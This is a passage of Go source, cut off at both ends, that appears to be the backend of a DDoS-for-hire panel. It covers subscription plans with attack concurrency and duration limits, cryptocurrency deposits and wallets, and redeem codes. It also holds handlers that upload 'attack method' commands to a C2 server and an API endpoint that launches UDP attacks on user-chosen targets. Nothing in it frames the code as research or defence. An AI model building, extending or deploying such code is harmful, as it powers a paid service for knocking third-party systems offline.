		conc, _ := strconv.Atoi(r.FormValue("concurrents"))
		time, _ := strconv.Atoi(r.FormValue("time"))
		vip := r.FormValue("vip") == "true"
		api := r.FormValue("api") == "true"
		db.Exec("INSERT OR REPLACE INTO plans (name, concurrents, max_time, vip, api) VALUES (?, ?, ?, ?, ?)", name, conc, time, vip, api)
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeAdmin,
			Username:  u,
			Action:    "ADMIN_PLAN_CONFIG",
			Severity:  severityInfo,
			Message:   "Plan configuration updated.",
			ResourceIDs: map[string]string{
				"plan": name,
			},
			Metadata: map[string]interface{}{
				"concurrents": conc,
				"max_time":    time,
				"vip":         vip,
				"api":         api,
			},
		})
	} else {
		rows, err := db.Query("SELECT name, api FROM plans")
		if err == nil {
			defer rows.Close()
			for rows.Next() {
				var planName string
				var api bool
				if err := rows.Scan(&planName, &api); err != nil {
					continue
				}
				conc, err := strconv.Atoi(r.FormValue(planName + "_conc"))
				if err != nil {
					continue
				}
				maxTime, err := strconv.Atoi(r.FormValue(planName + "_time"))
				if err != nil {
					continue
				}
				vip := r.FormValue(planName+"_vip") == "on" || r.FormValue(planName+"_vip") == "true"
				db.Exec("UPDATE plans SET concurrents=?, max_time=?, vip=?, api=? WHERE name=?", conc, maxTime, vip, api, planName)
				LogActivity(r, ActivityLogEntry{
					ActorType: actorTypeAdmin,
					Username:  u,
					Action:    "ADMIN_PLAN_CONFIG",
					Severity:  severityInfo,
					Message:   "Plan configuration updated.",
					ResourceIDs: map[string]string{
						"plan": planName,
					},
					Metadata: map[string]interface{}{
						"concurrents": conc,
						"max_time":    maxTime,
						"vip":         vip,
						"api":         api,
					},
				})
			}
		}
	}
	http.Redirect(w, r, "/admin?view=settings", 302)
}

func handleAddProduct(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	name := r.FormValue("name")
	price, _ := strconv.ParseFloat(r.FormValue("price"), 64)
	dur, _ := strconv.Atoi(r.FormValue("time"))
	conc, _ := strconv.Atoi(r.FormValue("concurrents"))
	vip := r.FormValue("vip") == "on"
	api := r.FormValue("api") == "on"
	db.Exec("INSERT INTO products (name, price, time, concurrents, vip, api_access) VALUES (?, ?, ?, ?, ?, ?)", name, price, dur, conc, vip, api)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeAdmin,
		Username:  u,
		Action:    "ADMIN_PRODUCT_ADD",
		Severity:  severityInfo,
		Message:   "Product added.",
		Metadata: map[string]interface{}{
			"name":        name,
			"price":       price,
			"time":        dur,
			"concurrents": conc,
			"vip":         vip,
			"api_access":  api,
		},
	})
	http.Redirect(w, r, "/admin?view=market", 302)
}

func handleDelProduct(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	productID := r.FormValue("id")
	db.Exec("DELETE FROM products WHERE id = ?", productID)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeAdmin,
		Username:  username,
		Action:    "ADMIN_PRODUCT_DELETE",
		Severity:  severityInfo,
		Message:   "Product deleted.",
		ResourceIDs: map[string]string{
			"product_id": productID,
		},
	})
	http.Redirect(w, r, "/admin?view=market", 302)
}

func handleAddWallet(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method == http.MethodGet {
		q := r.URL.Query()
		if q.Get("view") == "" {
			q.Set("view", "finance")
			r.URL.RawQuery = q.Encode()
		}
		handleAdminPage(w, r)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	address := Sanitize(r.FormValue("address"))
	privateKey, err := encryptWalletPrivateKey(r.FormValue("private_key"))
	if err != nil {
		http.Error(w, fmt.Sprintf("Wallet encryption unavailable. Set %s.", walletKeyEnvName), http.StatusInternalServerError)
		return
	}
	db.Exec("INSERT INTO wallets(address, private_key, status, assigned_to) VALUES (?, ?, 'Free', NULL)", address, privateKey)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeAdmin,
		Username:  username,
		Action:    "ADMIN_WALLET_ADD",
		Severity:  severityInfo,
		Message:   "Wallet added.",
		Metadata: map[string]interface{}{
			"address": maskAddress(address),
		},
	})
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleDelWallet(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	address := Sanitize(r.FormValue("address"))
	db.Exec("DELETE FROM wallets WHERE address=?", address)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeAdmin,
		Username:  username,
		Action:    "ADMIN_WALLET_DELETE",
		Severity:  severityInfo,
		Message:   "Wallet deleted.",
		Metadata: map[string]interface{}{
			"address": maskAddress(address),
		},
	})
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleBlacklistOp(w http.ResponseWriter, r *http.Request) {
	username, ok := validateSession(r)
	if !ok || username != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	action := r.FormValue("action")
	target := Sanitize(r.FormValue("target"))
	if action == "add" {
		reason := Sanitize(r.FormValue("reason"))
		db.Exec("INSERT INTO blacklist VALUES (?, ?, ?)", target, reason, time.Now().Format("2006-01-02"))
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeAdmin,
			Username:  username,
			Action:    "ADMIN_BLACKLIST_ADD",
			Severity:  severityInfo,
			Message:   "Blacklist entry added.",
			ResourceIDs: map[string]string{
				"target": target,
			},
			Metadata: map[string]interface{}{
				"reason": reason,
			},
		})
	} else {
		db.Exec("DELETE FROM blacklist WHERE target = ?", target)
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeAdmin,
			Username:  username,
			Action:    "ADMIN_BLACKLIST_DELETE",
			Severity:  severityInfo,
			Message:   "Blacklist entry removed.",
			ResourceIDs: map[string]string{
				"target": target,
			},
		})
	}
	http.Redirect(w, r, "/admin?view=blacklist", 302)
}

func handleUploadMethod(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}

	name := Sanitize(r.FormValue("name"))
	layer := strings.ToLower(strings.TrimSpace(r.FormValue("type")))
	command := strings.TrimSpace(r.FormValue("command"))
	if name == "" || (layer != "layer4" && layer != "layer7") || command == "" {
		http.Redirect(w, r, "/admin?view=methods&err=invalid", 302)
		return
	}

	// Save locally so user panel can always reflect admin-configured methods.
	_, _ = db.Exec("INSERT OR REPLACE INTO methods(name, layer, command, enabled) VALUES (?, ?, ?, 1)", name, layer, command)

	// Forward to C2 as before (best effort).
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	writer.WriteField("name", name)
	writer.WriteField("type", layer)
	writer.WriteField("command", command)
	writer.Close()

	req, _ := http.NewRequest("POST", cfg.C2Host+"/admin/upload_method", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("X-API-Key", cfg.C2Key)
	client := &http.Client{Timeout: 10 * time.Second}
	_, _ = client.Do(req)

	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeAdmin,
		Username:  u,
		Action:    "ADMIN_METHOD_UPLOAD",
		Severity:  severityInfo,
		Message:   "Attack method uploaded.",
		Metadata: map[string]interface{}{
			"name":    name,
			"layer":   layer,
			"command": command,
		},
	})
	http.Redirect(w, r, "/admin?view=methods", 302)
}

func handleDepositAction(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok || u != "admin" {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	id := r.FormValue("id")
	action := r.FormValue("action")
	tx, err := db.Begin()
	if err != nil {
		logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(u), "DB_ERROR", err, nil)
		http.Error(w, "Database Error", http.StatusInternalServerError)
		return
	}
	if action == "confirm" {
		var user string
		var usd float64
		if err := tx.QueryRow("SELECT user_id, usd_amount FROM deposits WHERE id=?", id).Scan(&user, &usd); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("query deposit: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(u), "DB_ERROR", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if _, err := tx.Exec("UPDATE deposits SET status='Paid', confirmed_at=? WHERE id=?", time.Now().Format("2006-01-02 15:04"), id); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("deposit update: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(user), "DEPOSIT_UPDATE_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if _, err := tx.Exec("UPDATE users SET balance=balance+? WHERE username=?", usd, user); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("update balance: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(user), "DB_ERROR", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if err := releaseWalletForDepositTx(tx, id, time.Now()); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("release wallet: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("release_wallet", id, 0, getUserIDByUsername(user), "WALLET_RELEASE_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if err := tx.Commit(); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("commit: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(user), "TX_COMMIT_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeAdmin,
			Username:  u,
			Action:    "DEPOSIT_CONFIRMED",
			Severity:  severityInfo,
			Message:   "Deposit confirmed by admin.",
			ResourceIDs: map[string]string{
				"deposit_id": id,
			},
			Metadata: map[string]interface{}{
				"user":       user,
				"usd_amount": usd,
			},
		})
	} else {
		var user string
		if err := tx.QueryRow("SELECT user_id FROM deposits WHERE id=?", id).Scan(&user); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("query deposit: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(u), "DB_ERROR", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if _, err := tx.Exec("UPDATE deposits SET status='Rejected' WHERE id=?", id); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("deposit update: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(user), "DEPOSIT_UPDATE_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if err := releaseWalletForDepositTx(tx, id, time.Now()); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("release wallet: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("release_wallet", id, 0, getUserIDByUsername(user), "WALLET_RELEASE_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		if err := tx.Commit(); err != nil {
			if rollbackErr := tx.Rollback(); rollbackErr != nil {
				err = fmt.Errorf("commit: %w; rollback: %v", err, rollbackErr)
			}
			logDepositError("admin_deposit_action", id, 0, getUserIDByUsername(user), "TX_COMMIT_FAILED", err, nil)
			http.Redirect(w, r, "/admin?view=finance&err=db", 302)
			return
		}
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeAdmin,
			Username:  u,
			Action:    "DEPOSIT_REJECTED",
			Severity:  severityWarn,
			Message:   "Deposit rejected by admin.",
			ResourceIDs: map[string]string{
				"deposit_id": id,
			},
		})
	}
	http.Redirect(w, r, "/admin?view=finance", 302)
}

func handleCreateTicket(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	subject := Sanitize(r.FormValue("subject"))
	category := r.FormValue("category")
	message := Sanitize(r.FormValue("message"))
	tid := generateID()
	msg := []TicketMessage{{Sender: u, Content: message, Time: time.Now().Format("2006-01-02 15:04"), IsAdmin: false}}
	msgJSON, _ := json.Marshal(msg)
	db.Exec("INSERT INTO tickets (id, user_id, category, subject, status, last_update, messages) VALUES (?, ?, ?, ?, ?, ?, ?)", tid, u, category, subject, "Open", time.Now(), string(msgJSON))
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(u),
		Username:  u,
		Action:    "TICKET_CREATED",
		Severity:  severityInfo,
		Message:   "Support ticket created.",
		ResourceIDs: map[string]string{
			"ticket_id": tid,
		},
		Metadata: map[string]interface{}{
			"category": category,
			"subject":  subject,
		},
	})
	http.Redirect(w, r, "/support?msg=ticket_created", http.StatusFound)
}

func handleReplyTicket(w http.ResponseWriter, r *http.Request) {
	u, ok := validateSession(r)
	if !ok {
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}
	if r.ContentLength > maxBodySize {
		http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			http.Error(w, "Request Entity Too Large", http.StatusRequestEntityTooLarge)
			return
		}
	}
	if !validateCSRF(r) {
		http.Error(w, "CSRF Validation Failed", http.StatusForbidden)
		return
	}
	tid := r.FormValue("id")
	message := Sanitize(r.FormValue("message"))
	var msgJSON string
	var status string
	db.QueryRow("SELECT messages, status FROM tickets WHERE id=?", tid).Scan(&msgJSON, &status)
	var msgs []TicketMessage
	json.Unmarshal([]byte(msgJSON), &msgs)
	isAdmin := (u == "admin")
	msgs = append(msgs, TicketMessage{Sender: u, Content: message, Time: time.Now().Format("2006-01-02 15:04"), IsAdmin: isAdmin})
	if isAdmin {
		status = "Answered"
	} else {
		status = "Pending"
	}
	newMsgJSON, _ := json.Marshal(msgs)
	db.Exec("UPDATE tickets SET messages = ?, status = ?, last_update = ? WHERE id = ?", string(newMsgJSON), status, time.Now(), tid)
	LogActivity(r, ActivityLogEntry{
		ActorType: func() string {
			if isAdmin {
				return actorTypeAdmin
			}
			return actorTypeUser
		}(),
		ActorID:  getUserIDByUsername(u),
		Username: u,
		Action:   "TICKET_REPLY",
		Severity: severityInfo,
		Message:  "Ticket reply added.",
		ResourceIDs: map[string]string{
			"ticket_id": tid,
		},
	})
	if isAdmin {
		http.Redirect(w, r, "/admin?view=tickets&ticket="+tid, 302)
	} else {
		http.Redirect(w, r, "/support?ticket="+tid+"&msg=ticket_reply", 302)
	}
}

func handleNewCaptcha(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(captcha.New()))
}

func apiLaunch(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		writeJSONError(w, http.StatusTooManyRequests, "rate_limited", "Too many requests.")
		return
	}
	tok := ""
	if ah := r.Header.Get("Authorization"); strings.HasPrefix(ah, "Bearer ") {
		tok = strings.TrimSpace(strings.TrimPrefix(ah, "Bearer "))
	}
	if tok == "" {
		writeJSONError(w, http.StatusUnauthorized, "missing_token", "Authorization required.")
		return
	}

	usr, ok := getUserByToken(tok)
	if !ok {
		writeJSONError(w, http.StatusForbidden, "bad_token", "Invalid token.")
		return
	}
	if strings.TrimSpace(usr.Status) != "Active" {
		writeJSONError(w, http.StatusForbidden, "inactive_user", "User is inactive.")
		return
	}
	planName := effectivePlanName(usr.Plan)
	limits := getPlanConfig(planName)
	if !limits.API {
		writeJSONError(w, http.StatusForbidden, "api_not_allowed", "API access is not enabled for this plan.")
		return
	}
	if r.ContentLength > maxBodySize {
		writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := r.ParseForm(); err != nil {
		if isRequestBodyTooLarge(err) {
			writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
			return
		}
		writeJSONError(w, http.StatusBadRequest, "bad_request", "Invalid request payload.")
		return
	}
	target := Sanitize(r.FormValue("target"))
	if target == "" {
		writeJSONError(w, http.StatusBadRequest, "missing_target", "Target is required.")
		return
	}
	if isBlacklisted(target) {
		logBlacklistReject(r, ip, usr.Username, target)
		writeJSONError(w, http.StatusForbidden, "target_blacklisted", "Target is blacklisted.")
		return
	}
	launchAttack(usr.Username, target, "80", "60", "UDP", "1")
	w.Write([]byte(`{"status":"sent"}`))
}

func handleRedeemLogin(w http.ResponseWriter, r *http.Request) {
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, "")
		http.Redirect(w, r, "/login?err=rate_limit&mode=redeem", http.StatusFound)
		return
	}
	if r.Method != http.MethodPost {
		http.Redirect(w, r, "/login?mode=redeem", http.StatusFound)
		return
	}
	// CSRF validation (same as login/register)
	if !validateCSRF(r) {
		http.Redirect(w, r, "/login?err=csrf&mode=redeem", http.StatusFound)
		return
	}

	code := Sanitize(r.FormValue("redeem_code"))
	if code == "" {
		http.Redirect(w, r, "/login?err=invalid_code&mode=redeem", http.StatusFound)
		return
	}

	var plan string
	var used bool
	tx, err := db.Begin()
	if err != nil {
		http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
		return
	}
	committed := false
	defer func() {
		if !committed {
			_ = tx.Rollback()
		}
	}()
	if err := tx.QueryRow("SELECT plan, used FROM redeem_codes WHERE code=?", code).Scan(&plan, &used); err != nil {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			Action:    "AUTH_REDEEM_FAILED",
			Severity:  severityWarn,
			Message:   "Redeem login failed due to invalid code.",
		})
		http.Redirect(w, r, "/login?err=invalid_code&mode=redeem", http.StatusFound)
		return
	}
	if used {
		http.Redirect(w, r, "/login?err=code_used&mode=redeem", http.StatusFound)
		return
	}
	plan = effectivePlanName(plan)

	// Create a minimal one-time user bound to this redeem code
	// Username pattern: redeem-<id>
	username := "redeem-" + generateID()
	passwd := generateToken()
	hash, err := generatePasswordHash(passwd)
	if err != nil {
		http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
		return
	}
	refCode, err := generateUniqueRefCode()
	if err != nil {
		http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
		return
	}
	apiTok := generateToken()
	userID := "u#" + generateID()

	// Insert user; on rare collision, retry with a different id once
	if _, err := tx.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings, ref_paid) VALUES (?, ?, ?, 'Active', ?, ?, 0.0, ?, '', 0.0, 0)", username, hash, plan, apiTok, userID, refCode); err != nil {
		// Try one more time
		username = "redeem-" + generateID()
		if _, err2 := tx.Exec("INSERT INTO users (username, password, plan, status, api_token, user_id, balance, ref_code, referred_by, ref_earnings, ref_paid) VALUES (?, ?, ?, 'Active', ?, ?, 0.0, ?, '', 0.0, 0)", username, hash, plan, apiTok, userID, refCode); err2 != nil {
			http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
			return
		}
	}

	// Mark code used only after user has been created
	res, err := tx.Exec("UPDATE redeem_codes SET used=1 WHERE code=? AND used=0", code)
	if err != nil {
		http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
		return
	}
	affected, err := res.RowsAffected()
	if err != nil || affected == 0 {
		http.Redirect(w, r, "/login?err=code_used&mode=redeem", http.StatusFound)
		return
	}
	if err := tx.Commit(); err != nil {
		http.Redirect(w, r, "/login?err=1&mode=redeem", http.StatusFound)
		return
	}
	committed = true

	token := createSession(username, r)
	if token == "" {
		http.Redirect(w, r, "/login?err=session&mode=redeem", http.StatusFound)
		return
	}
	setSessionCookie(w, r, token, 86400)
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "AUTH_REDEEM_SUCCESS",
		Severity:  severityInfo,
		Message:   "Redeem login succeeded.",
		Metadata: map[string]interface{}{
			"plan": plan,
		},
	})
	http.Redirect(w, r, "/dashboard?welcome=true", http.StatusFound)
}

// --- PROFILE / ACCOUNT APIs ---

func handleChangePassword(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, username)
		writeJSONError(w, http.StatusTooManyRequests, "rate_limited", "Too many requests.")
		return
	}

	var req struct {
		Current string `json:"current"`
		Next    string `json:"next"`
		Confirm string `json:"confirm"`
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		if isRequestBodyTooLarge(err) {
			writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
			return
		}
		writeJSONError(w, http.StatusBadRequest, "bad_request", "Invalid request payload.")
		return
	}
	if req.Next == "" || req.Current == "" {
		writeJSONError(w, http.StatusBadRequest, "missing_fields", "Missing required fields.")
		return
	}
	if req.Next != req.Confirm {
		writeJSONError(w, http.StatusBadRequest, "password_mismatch", "Password confirmation does not match.")
		return
	}
	if len(req.Next) < 8 {
		writeJSONError(w, http.StatusBadRequest, "password_too_short", "Password must be at least 8 characters.")
		return
	}

	var dbHash string
	if err := db.QueryRow("SELECT password FROM users WHERE username=?", username).Scan(&dbHash); err != nil {
		writeJSONError(w, http.StatusBadRequest, "user_not_found", "User not found.")
		return
	}
	match, _ := comparePasswordAndHash(req.Current, dbHash)
	if !match {
		writeJSONError(w, http.StatusForbidden, "invalid_password", "Current password is incorrect.")
		return
	}

	newHash, err := generatePasswordHash(req.Next)
	if err != nil {
		writeJSONError(w, http.StatusInternalServerError, "server_error", "Server error.")
		return
	}
	if _, err := db.Exec("UPDATE users SET password=? WHERE username=?", newHash, username); err != nil {
		writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
		return
	}

	if c, err := r.Cookie(sessionCookieName); err == nil && c.Value != "" {
		if _, err := db.Exec("DELETE FROM sessions WHERE username=? AND token<>?", username, c.Value); err != nil {
			writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
			return
		}
	}

	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "AUTH_PASSWORD_CHANGED",
		Severity:  severityInfo,
		Message:   "Password changed successfully.",
	})
	json.NewEncoder(w).Encode(map[string]any{"status": "ok"})
}

func handleRotateToken(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}
	ip := getIP(r)
	if isRateLimited(ip) {
		logRateLimit(r, ip, username)
		writeJSONError(w, http.StatusTooManyRequests, "rate_limited", "Too many requests.")
		return
	}

	newTok := generateToken() + generateToken()
	if _, err := db.Exec("UPDATE users SET api_token=? WHERE username=?", newTok, username); err != nil {
		writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
		return
	}
	LogActivity(r, ActivityLogEntry{
		ActorType: actorTypeUser,
		ActorID:   getUserIDByUsername(username),
		Username:  username,
		Action:    "AUTH_TOKEN_ROTATED",
		Severity:  severityInfo,
		Message:   "API token rotated.",
	})
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "token": newTok})
}

func handleListSessions(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	current := ""
	if c, err := r.Cookie(sessionCookieName); err == nil {
		current = c.Value
	}

	rows, err := db.Query("SELECT token, COALESCE(created_at,0), COALESCE(last_seen,0), COALESCE(user_agent,''), COALESCE(ip,''), expires FROM sessions WHERE username=? ORDER BY COALESCE(last_seen,0) DESC", username)
	if err != nil {
		writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
		return
	}
	defer rows.Close()

	out := []SessionInfo{}
	for rows.Next() {
		var s SessionInfo
		_ = rows.Scan(&s.Token, &s.CreatedAt, &s.LastSeen, &s.UserAgent, &s.IP, &s.Expires)
		s.IsCurrent = s.Token == current
		out = append(out, s)
	}
	json.NewEncoder(w).Encode(out)
}

func handleRevokeSession(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}

	var req struct {
		Token string `json:"token"`
	}
	r.Body = http.MaxBytesReader(w, r.Body, maxBodySize)
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Token == "" {
		if isRequestBodyTooLarge(err) {
			writeJSONError(w, http.StatusRequestEntityTooLarge, "payload_too_large", "Request body too large.")
			return
		}
		writeJSONError(w, http.StatusBadRequest, "bad_request", "Invalid request payload.")
		return
	}

	res, err := db.Exec("DELETE FROM sessions WHERE token=? AND username=?", req.Token, username)
	if err != nil {
		writeJSONError(w, http.StatusInternalServerError, "db_error", "Database error.")
		return
	}
	affected, _ := res.RowsAffected()
	if affected > 0 {
		LogActivity(r, ActivityLogEntry{
			ActorType: actorTypeUser,
			ActorID:   getUserIDByUsername(username),
			Username:  username,
			Action:    "AUTH_SESSION_REVOKED",
			Severity:  severityInfo,
			Message:   "Session revoked.",
		})
	}
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "revoked": affected > 0})
}

func handleRevokeAllSessions(w http.ResponseWriter, r *http.Request) {
	setSecurityHeaders(w)
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")

	username, ok := validateSession(r)
	if !ok {
		writeJSONError(w, http.StatusUnauthorized, "unauthorized", "Authentication required.")
		return
	}
	if r.Method != http.MethodPost {
		writeJSONError(w, http.StatusMethodNotAllowed, "method_not_allowed", "Method not allowed.")
		return
	}
	if !validateCSRF(r) {
		writeJSONError(w, http.StatusForbidden, "csrf", "CSRF validation failed.")
		return
	}

	// Keep current session token so user doesn't immediately log themselves out.
	current := ""
	if c, err := r.Cookie(sessionCookieName); err == nil {
